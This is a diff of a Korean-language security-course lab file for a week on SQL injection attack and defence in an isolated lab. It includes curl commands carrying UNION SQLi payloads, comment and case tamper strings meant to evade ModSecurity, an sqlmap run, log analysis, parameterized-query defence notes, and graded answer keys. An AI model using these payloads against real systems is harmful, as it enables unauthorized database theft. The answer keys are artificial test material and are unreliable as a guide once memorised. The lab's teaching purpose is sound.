@@ -4,8 +4,14 @@ version: standalone-attack
 course: attack
 week: 4
 description: |
-  SQLi 공방 — 수동 UNION SQLi(dvwa 차단), WAF 우회(tamper) 시도와 CRS의 한계, sqlmap 자동화, 그리고
-  ModSec 탐지·차단 분석(dvwa 403 vs juice 200). 공격은 el34-attacker. 인가된 실습만. 명령은 el34 호스트에서.
+  SQL Injection 공방을 공격자(PTES Exploitation) 관점에서 손으로 익힌다. 먼저 가장 직접적인 수동 UNION
+  SQLi 를 보내 차단형 WAF(dvwa)가 403 으로 막는 것을 확인하고, 주석·대소문자 tamper 로 WAF 우회를 시도해
+  ModSec CRS 의 정규화(normalization) 때문에 단순 우회가 왜 무력한지 체감한다. 이어 자동화 도구 sqlmap 으로
+  juice 의 검색 파라미터를 4 기법으로 자동 테스트하며 그 "시끄러움"을 보고, 방어 측 modsec_audit.log 에서
+  본인 공격이 942(SQLi)+949110(anomaly)으로 잡힌 흔적을 분석한다. 마지막으로 같은 payload 가 차단 모드
+  (dvwa 403) vs 탐지 전용 모드(juice 200)로 갈리는 이유와 근본 방어(parameterized query)를 정리한다.
+  공격 도구는 el34-attacker, 로그 확인은 el34-web. 명령은 모두 el34 호스트(ssh ccc@192.168.0.151)에서
+  docker exec 로 실행한다. 인가된 실습 환경에서만 수행한다.
 difficulty: hard
 duration_minutes: 180
 prerequisites:
@@ -13,30 +19,35 @@ prerequisites:
   - "el34 호스트 SSH + docker exec"
   - "lecture §2(SQLi 유형) §3(sqlmap) §4(WAF 우회) 숙지"
 objectives:
-  - "수동 UNION SQLi + WAF 차단(403) 확인"
-  - "WAF 우회(tamper) 시도 + CRS 한계 이해"
-  - "sqlmap 자동화"
-  - "ModSec 탐지·차단 분석(차단 vs 탐지만)"
+  - "수동 UNION SQLi 를 직접 작성해 보내고 차단형 vhost(dvwa)에서 403 차단을 확인한다"
+  - "주석·대소문자 tamper 로 WAF 우회를 시도하고 ModSec CRS 의 정규화로 단순 우회가 무력함을 이해한다"
+  - "sqlmap 으로 한 파라미터를 4 기법으로 자동 테스트하고 다량 요청이 방어층에 탐지되는 특성을 안다"
+  - "modsec_audit.log 에서 942(SQLi)+949110(anomaly) 탐지 흔적을 찾고 차단 모드 vs 탐지 전용 모드 차이를 설명한다"
 pass_threshold: 0.7
 steps:
 
   - order: 1
     instruction: |
-      ## 🎯 점검 — sqlmap + 대상
+      ## 🎯 점검 — sqlmap 가용성 + 대상 도달성
+      모든 공격의 0단계는 "도구가 있고 대상에 닿는가" 확인이다. SQLi 자동화 도구 sqlmap 이
+      attacker 컨테이너에 설치돼 있는지, 그리고 차단형 vhost(dvwa)에 네트워크로 도달하는지 본다.
       ## 💻 실행 명령
       ```bash
       docker exec el34-attacker sh -c 'command -v sqlmap'
       docker exec el34-attacker sh -c "curl -s -o /dev/null -w '도달=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://10.20.30.1/"
       ```
+      - `command -v sqlmap` — sqlmap 실행 파일의 경로를 출력(설치돼 있으면 경로, 없으면 빈 출력).
+      - `curl ... -H 'Host: dvwa.el34.lab'` — fw 게이트웨이 10.20.30.1 로 보내되 Host 헤더로 dvwa
+        vhost 를 지정. `-o /dev/null -w '도달=%{http_code}'` 로 본문은 버리고 HTTP 코드만 본다.
       ## ✅ 합격 기준
-      sqlmap 사용 가능 + 대상 도달.
+      sqlmap 경로가 출력되어 사용 가능하고, dvwa 에 도달(HTTP 코드 응답)한다.
     hint: 'command -v sqlmap + 도달성'
     category: survey
     points: 10
     answer: |
       docker exec el34-attacker sh -c 'command -v sqlmap'
       docker exec el34-attacker sh -c "curl -s -o /dev/null -w '도달=%{http_code}\n' -H 'Host: dvwa.el34.lab' http://10.20.30.1/"
-    answer_detail: "SQLi 도구 sqlmap + 대상(dvwa 차단/juice 탐지만) 확인."
+    answer_detail: "SQLi 자동화 도구 sqlmap 이 attacker 에 설치됐는지(command -v 로 경로 확인)와 대상 vhost(dvwa=차단 모드, juice=탐지만)에 도달하는지를 점검한다. 공격 착수 전 도구·대상 준비 상태를 1분 내 확인하는 기본 절차다."
     verify:
       type: output_contains
       expect: 'sqlmap'
@@ -49,13 +60,19 @@ steps:
 
   - order: 2
     instruction: |
-      ## 🎯 수동 UNION SQLi — dvwa 차단
+      ## 🎯 수동 UNION SQLi — dvwa 차단(403)
+      가장 직접적인 UNION-based SQLi 를 손으로 만들어 보낸다. `UNION SELECT` 는 정상 질의 결과 뒤에
+      다른 테이블(users 의 계정·비밀번호)을 이어 붙여 응답에 노출시키는 기법이다. 차단형 WAF(dvwa)가
+      이 평문 SQLi 를 얼마나 쉽게 막는지 직접 확인한다.
       ## 💻 실행 명령
       ```bash
       docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--%20-\""
       ```
+      - payload `1' UNION SELECT user,password FROM users-- -` 가 URL 인코딩돼 있다(`%27`=작은따옴표
+        `'`, `%20`=공백). 끝의 `-- -` 는 뒤따르는 원래 SQL 을 주석 처리하는 흔한 SQLi 관용구다.
+      - dvwa vhost 는 `SecRuleEngine On`(차단 모드)이라 SQLi 룰에 걸리면 실제로 요청을 끊는다.
       ## ✅ 합격 기준
-      UNION SQLi가 dvwa에서 403(WAF 차단)된다.
+      UNION SQLi 가 dvwa 에서 403(WAF 차단)으로 응답된다.
     hint: 'UNION SELECT → dvwa 403'
     category: manipulation
     points: 12
@@ -63,7 +80,7 @@ steps:
       echo "=== 수동 UNION SQLi (dvwa 차단 모드) ==="
       docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%20user,password%20FROM%20users--%20-\""
       echo "→ UNION SELECT가 anomaly 누적 → 949110 차단(403). 고전 SQLi는 CRS가 잘 잡는다"
-    answer_detail: "UNION-based SQLi = 가장 직접적. dvwa(차단 모드)에서 942(SQLi)+949110(anomaly)으로 403. 평문 SQLi는 CRS가 쉽게 잡는다."
+    answer_detail: "UNION-based SQLi 는 다른 테이블을 결과에 합쳐 추출하는 가장 직접적인 기법이다. dvwa(SecRuleEngine On)에서는 payload 가 942 룰군(SQLi 변형)에 매치되고 anomaly score 가 누적돼 949110(임계치 도달)이 발동, 403 으로 차단된다. 평문 SQLi 는 CRS 가 가장 쉽게 잡는다는 점을 403 응답으로 판정한다."
     verify:
       type: output_contains
       expect: '403'
@@ -76,15 +93,22 @@ steps:
 
   - order: 3
     instruction: |
-      ## 🎯 WAF 우회(tamper) 시도 — CRS의 한계
+      ## 🎯 WAF 우회(tamper) 시도 — CRS 의 정규화라는 벽
+      payload 를 변형해 WAF 시그니처를 피하려는 시도가 tamper 다. 두 가지 고전 기법을 직접 넣어 본다 —
+      키워드 사이에 SQL 주석을 끼우는 주석 삽입(`UN/**/ION SE/**/LECT`)과 대소문자를 섞는 변형
+      (`UnIoN sElEcT`). 둘 다 DB 는 정상 실행하지만 단순 시그니처는 못 알아본다. 그러나 ModSec CRS 는
+      검사 전에 입력을 표준형으로 되돌리는 정규화(normalization)를 하므로, 두 변형 모두 `UNION SELECT`
+      로 복원돼 결국 잡힌다. "우회는 쉽지 않다"를 눈으로 확인하는 단계다.
       ## 💻 실행 명령
       ```bash
       # 주석/대소문자 tamper
       docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'comment=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UN/**/ION%20SE/**/LECT%201--\""
       docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'case=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UnIoN%20sElEcT%201--\""
       ```
+      - `UN/**/ION SE/**/LECT` — SQL 인라인 주석 `/**/` 을 키워드 중간에 삽입(주석 삽입 tamper).
+      - `UnIoN sElEcT` — SQL 키워드는 대소문자 무관하므로 섞어 쓴 변형(대소문자 tamper).
       ## ✅ 합격 기준
-      tamper 시도의 결과(대부분 여전히 403=CRS 정규화)를 확인한다.
+      tamper 시도가 CRS 정규화로 대부분 여전히 403(차단)됨을 확인한다.
     hint: 'UN/**/ION, UnIoN tamper → 결과'
     category: manipulation
     points: 14
@@ -93,7 +117,7 @@ steps:
       echo "[주석 삽입]"; docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'comment=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UN/**/ION%20SE/**/LECT%201--\""
       echo "[대소문자]"; docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'case=%{http_code}\n' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UnIoN%20sElEcT%201--\""
       echo "→ CRS는 정규화 후 검사 → 단순 tamper(주석/대소문자)는 대부분 여전히 403. 우회는 어렵다"
-    answer_detail: "WAF 우회 tamper(주석/대소문자/인코딩)는 ModSec CRS의 정규화(normalization)에 대부분 무력 — 여전히 403. CRS 942는 수십 변형을 잡는다. 우회엔 고급 기법 필요."
+    answer_detail: "주석 삽입·대소문자·인코딩 같은 단순 tamper 는 ModSec CRS 가 검사 전에 입력을 표준형으로 되돌리는 정규화(normalization) 때문에 대부분 무력하다 — 변형이 UNION SELECT 로 복원돼 여전히 403. CRS 942 룰군이 수십 가지 SQLi 변형을 포괄하므로, 우회하려면 정규화의 빈틈을 노리는 고급 기법이 필요하다. 여전히 차단(403)되는 결과로 CRS 의 견고함을 판정한다."
     verify:
       type: output_contains
       expect: '403'
@@ -106,13 +130,20 @@ steps:
 
   - order: 4
     instruction: |
-      ## 🎯 sqlmap 자동화
+      ## 🎯 sqlmap 자동화 — 한 파라미터를 4 기법으로
+      수동 시도를 자동화 도구로 대체한다. sqlmap 은 대상 URL 의 한 파라미터를 4 기법(Boolean/Time/
+      UNION/Error)으로 자동 주입해 취약 여부를 판별한다. 여기서는 juiceshop 의 REST 검색 파라미터
+      `/rest/products/search?q=` 를 대상으로 한다(juice 는 W03 에서 본 API 구조). 자동화의 위력과
+      동시에 "매우 시끄럽다"(다량 비정상 요청으로 WAF/IDS 에 다수 탐지)는 특성을 체감한다.
       ## 💻 실행 명령
       ```bash
       docker exec el34-attacker sh -c "timeout 40 sqlmap -u 'http://10.20.30.1/rest/products/search?q=test' -H 'Host: juice.el34.lab' --batch --level=1 --risk=1 --flush-session 2>&1 | grep -iE 'parameter|testing|sqlmap' | head -6"
       ```
+      - `-u <URL>` 대상 + `-H 'Host: juice.el34.lab'` vhost 지정. `--batch` 무인 자동 진행.
+      - `--level=1`(테스트 범위) · `--risk=1`(공격성) · `--flush-session`(이전 캐시 비워 재현성 확보).
+      - `timeout 40` 으로 40초 제한(차단·지연으로 멈추지 않게) 후 `parameter|testing|sqlmap` 라인만 추출.
       ## ✅ 합격 기준
-      sqlmap 자동 SQLi 테스트가 실행된다.
+      sqlmap 이 파라미터 자동 테스트를 시작해 출력에 testing 라인이 나타난다.
     hint: 'sqlmap --batch 자동 테스트'
     category: recon
     points: 12
@@ -120,7 +151,7 @@ steps:
       echo "=== sqlmap 자동화 ==="
       docker exec el34-attacker sh -c "timeout 40 sqlmap -u 'http://10.20.30.1/rest/products/search?q=test' -H 'Host: juice.el34.lab' --batch --level=1 --risk=1 --flush-session 2>&1 | grep -iE 'parameter|testing|sqlmap' | head -6"
       echo "→ sqlmap이 파라미터를 자동 테스트(boolean/time/union/error). 빠르지만 매우 시끄러움"
-    answer_detail: "sqlmap = SQLi 자동화 — 파라미터를 4 기법으로 자동 테스트. --tamper로 WAF 우회. 효율적이지만 다량 요청이라 WAF/IDS에 명확히 탐지."
+    answer_detail: "sqlmap 은 한 파라미터를 4 기법(Boolean/Time/UNION/Error)으로 자동 주입해 SQLi 를 탐지·악용하는 도구다(--tamper 로 WAF 우회 변형까지 자동화). 효율적이지만 한 파라미터 검증에 수십~수백 개의 비정상 요청을 보내므로 WAF/IDS 에 다량 탐지된다 — '빠르지만 들키는' 도구다. 출력의 testing 라인(파라미터 테스트 시작)으로 자동화 동작을 판정한다(timeout 40 으로 완주 못 해도 시작 자체가 합격)."
     verify:
       type: output_contains
       expect: 'testing'
@@ -133,13 +164,19 @@ steps:
 
   - order: 5
     instruction: |
-      ## 🎯 탐지 분석 — ModSec 942
+      ## 🎯 탐지 분석 — ModSec 942(방어 측 시점)
+      공격을 보냈으니 이제 방어 측이 무엇을 봤는지 확인한다. el34 의 WAF(ModSecurity)는 차단된
+      트랜잭션을 web 컨테이너의 modsec_audit.log 에 JSON 한 줄씩 남긴다. 앞 단계들에서 보낸 SQLi 가
+      어떤 룰에 잡혔는지 룰 ID 를 집계해, 본인 공격이 정확히 SQLi 룰군(942)에 걸렸음을 검증한다.
       ## 💻 실행 명령
       ```bash
       docker exec el34-web sh -c 'sudo tail -150 /var/log/apache2/modsec_audit.log | grep -oE "94[0-9]1[0-9]{2}" | sort | uniq -c'
       ```
+      - `el34-web` 의 `/var/log/apache2/modsec_audit.log` — ModSec 의 JSON 감사 로그(차단 트랜잭션 기록).
+      - `grep -oE "94[0-9]1[0-9]{2}"` 로 9xx 대역 룰 ID 만 뽑아 `sort | uniq -c` 로 등장 빈도를 집계한다.
+      - 942 는 SQLi 룰군, 949110 은 anomaly score 임계치 도달(차단 발동점)을 뜻한다.
       ## ✅ 합격 기준
-      SQLi가 ModSec 942(+949110)에 탐지됨을 확인한다.
+      집계 결과에 942(SQLi 룰군)가 보여 SQLi 가 정상 탐지됐음을 확인한다.
     hint: 'modsec 942/949110'
     category: analysis
     points: 12
@@ -147,7 +184,7 @@ steps:
       echo "=== SQLi 탐지 (ModSec) ==="
       docker exec el34-web sh -c 'sudo tail -150 /var/log/apache2/modsec_audit.log | grep -oE "94[0-9]1[0-9]{2}" | sort | uniq -c'
       echo "→ 942xxx(SQLi 룰군)이 payload 변형을 잡고, 949110(anomaly 누적)에서 차단"
-    answer_detail: "SQLi 탐지 = ModSec 942 룰군(SQLi 변형 수십 개) + 949110(anomaly 누적 차단). tamper해도 942의 여러 룰이 잡는다."
+    answer_detail: "방어 측 시점에서 본인 SQLi 의 탐지 흔적을 확인하는 단계다. modsec_audit.log 의 룰 ID 를 집계하면 942 룰군(SQLi 변형 수십 종)이 잡히고, anomaly score 가 누적돼 949110(임계치 도달)에서 차단이 발동한다. tamper 를 써도 정규화 후 942 의 여러 룰이 잡으므로 942 의 등장으로 SQLi 탐지를 판정한다. (매치 룰 ID 는 vhost 별 *_error.log 에도 id \"942100\" 형식으로 남는다.)"
     verify:
       type: output_contains
       expect: '942'
@@ -160,14 +197,21 @@ steps:
 
   - order: 6
     instruction: |
-      ## 🎯 차단 vs 탐지 — dvwa vs juice
+      ## 🎯 차단 vs 탐지 — dvwa(On) vs juice(DetectionOnly)
+      본 주차의 핵심 비교다. 완전히 같은 SQLi payload 를 두 vhost 에 보내 결과가 갈리는 것을 확인한다.
+      차이의 원인은 WAF 운영 모드 한 줄 — dvwa 는 SecRuleEngine On(차단)이라 403, juice 는
+      DetectionOnly(탐지만)라 200 으로 통과한다. 단, juice 의 200 은 "안 들킨 것"이 아니라 audit
+      log 에는 기록되되 막지만 않는 것임을 이해한다. 이는 버그가 아니라 운영 정책의 선택이다(새 룰을
+      도입할 때 오탐 관찰을 위해 DetectionOnly 로 켰다가 안정되면 On 으로 전환).
       ## 💻 실행 명령
       ```bash
       docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code} ' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%201--\""
       docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'juice=%{http_code}\n' -H 'Host: juice.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%201--\""
       ```
+      - 두 요청의 payload(`1' UNION SELECT 1--`)는 동일하다. 다른 것은 Host 헤더(vhost)뿐이다.
+      - 같은 web 컨테이너가 두 vhost 를 호스팅하지만 vhost 별 ModSec 모드가 달라 결과가 갈린다.
       ## ✅ 합격 기준
-      같은 SQLi가 dvwa(403 차단) vs juice(200 탐지만)로 다름을 확인한다.
+      같은 SQLi 가 dvwa=403(차단)과 juice=200(탐지만)으로 다르게 응답됨을 확인한다.
     hint: '같은 payload dvwa 403 vs juice 200'
     category: analysis
     points: 12
@@ -176,7 +220,7 @@ steps:
       docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'dvwa=%{http_code} ' -H 'Host: dvwa.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%201--\""
       docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'juice=%{http_code}\n' -H 'Host: juice.el34.lab' \"http://10.20.30.1/?id=1%27%20UNION%20SELECT%201--\""
       echo "→ dvwa=403(차단 모드), juice=200(DetectionOnly, 탐지만). 같은 공격, 다른 결과 = WAF 정책 차이"
-    answer_detail: "WAF 모드가 결과를 가른다 — dvwa(SecRuleEngine On)=403 차단, juice(DetectionOnly)=200(탐지는 기록되나 차단 안 함). 운영 정책의 선택(차단 vs 모니터링)."
+    answer_detail: "완전히 같은 payload 인데 WAF 운영 모드가 결과를 가른다 — dvwa(SecRuleEngine On)는 룰 매치 시 실제로 끊어 403, juice(DetectionOnly)는 탐지·기록만 하고 막지 않아 200. juice 의 200 은 우회 성공이 아니라 audit log 에 흔적이 남는 모니터링 모드일 뿐이다. 차단 vs 모니터링은 운영 정책의 선택이며, juice=200 확인으로 모드 차이를 판정한다."
     verify:
       type: output_contains
       expect: 'juice=200'
@@ -189,13 +233,18 @@ steps:
 
   - order: 7
     instruction: |
-      ## 🎯 방어 — parameterized query + WAF
+      ## 🎯 방어 — parameterized query(근본) + WAF(보조)
+      공격자도 근본 방어를 알아야 한다(코드 수준 방어가 된 대상에서는 SQLi 가 안 먹힌다). SQLi 의
+      진짜 해결은 parameterized query(prepared statement) — 입력을 SQL 문자열에 이어 붙이지 않고
+      자리표시자에 데이터로만 바인딩해, `' OR '1'='1` 이 들어와도 코드가 아닌 "그런 이름의 데이터를
+      찾아라"로만 처리되게 한다. SQLi 가 원천적으로 성립하지 않는다. WAF 는 알려진 패턴을 앞단에서
+      걸러 시간을 벌어주는 보조일 뿐(우회 가능)이라 단독 의존은 금물이다.
       ## 💻 실행 명령
       ```bash
       echo "근본 방어: parameterized query(prepared statement) — 입력을 데이터로만. WAF는 보조(우회 가능)"
       ```
       ## ✅ 합격 기준
-      SQLi 근본 방어(parameterized query)를 정리한다.
+      SQLi 근본 방어가 parameterized query 임을, WAF 는 보조임을 정리한다.
     hint: 'parameterized query 근본 방어'
     category: report
     points: 10
@@ -205,7 +254,7 @@ steps:
       echo "② 보조: WAF(ModSec CRS) — 알려진 패턴 차단(우회 가능, 단독 의존 금지)"
       echo "③ 최소권한 DB 계정, 에러 메시지 숨김, ORM 안전 사용"
       echo "→ WAF는 시간을 벌어주지만 근본 해결은 코드(parameterized query)"
-    answer_detail: "SQLi 근본 방어 = parameterized query(입력을 데이터로 분리). WAF는 보조(우회 가능). 코드 수정이 진짜 해결."
+    answer_detail: "SQLi 근본 방어는 parameterized query(prepared statement) — 입력을 코드가 아닌 데이터로만 바인딩해 인젝션 자체를 성립 불가로 만든다. WAF(ModSec CRS)는 알려진 패턴을 막아 시간을 버는 보조 수단일 뿐 우회가 가능하므로 단독 의존은 금물이다. 추가로 최소권한 DB 계정·에러 메시지 숨김·안전한 ORM 사용이 심층 방어가 된다. 답안에 parameterized 가 포함되면 핵심을 짚은 것으로 판정한다."
     verify:
       type: output_contains
       expect: 'parameterized'
@@ -218,7 +267,10 @@ steps:
 
   - order: 8
     instruction: |
-      ## 🎯 SQLi 공격 보고서
+      ## 🎯 SQLi 공격 보고서 (PTES Reporting)
+      모의해킹의 산출물은 보고서다. 본 주차 공방(수동 UNION SQLi → WAF 우회 시도 → sqlmap 자동화 →
+      탐지·차단 분석 → 방어)을 한 장으로 종합한다. 각 항목에 실행 명령과 관찰한 결과 코드(dvwa 403,
+      juice 200 등)를 근거로 적어, 재현 가능한 보고서가 되게 한다.
       ## 💻 보고서 양식
       ```markdown
       # 공격 W04 SQLi 보고서 (학번, 이름)
@@ -228,7 +280,7 @@ steps:
       ## 4. 탐지/차단 분석 + 방어
       ```
       ## ✅ 합격 기준
-      보고서에 SQLi 공방 + 방어가 포함된다.
+      보고서에 SQLi 공방(수동/우회/sqlmap)과 방어가 모두 포함된다.
     hint: 'SQLi+우회+sqlmap+방어'
     category: report
     points: 10
@@ -241,7 +293,7 @@ steps:
       ## 4. 분석: dvwa(403 차단) vs juice(200 탐지만). 방어=parameterized query(근본)+WAF(보조)
       ## 결론: 고전 SQLi는 CRS가 잘 막음. 우회는 어렵고 시끄럽다. 근본 방어는 코드
       EOF
-    answer_detail: "SQLi 공방 = 공격(수동/sqlmap/우회) vs 방어(CRS/모드/코드). 근본 방어는 parameterized query."
+    answer_detail: "SQLi 공방 전체를 종합하는 보고서다 — 공격(수동 UNION/tamper 우회/sqlmap 자동화) vs 방어(CRS 942 탐지/차단 모드 vs 탐지 전용 모드/코드 수정). 근본 방어는 parameterized query 이고 WAF 는 보조라는 결론까지 담겨야 한다. PTES Reporting 단계의 산출물 형식으로, SQLi 가 포함된 종합 보고를 합격으로 판정한다."
     verify:
       type: output_contains
       expect: 'SQLi'
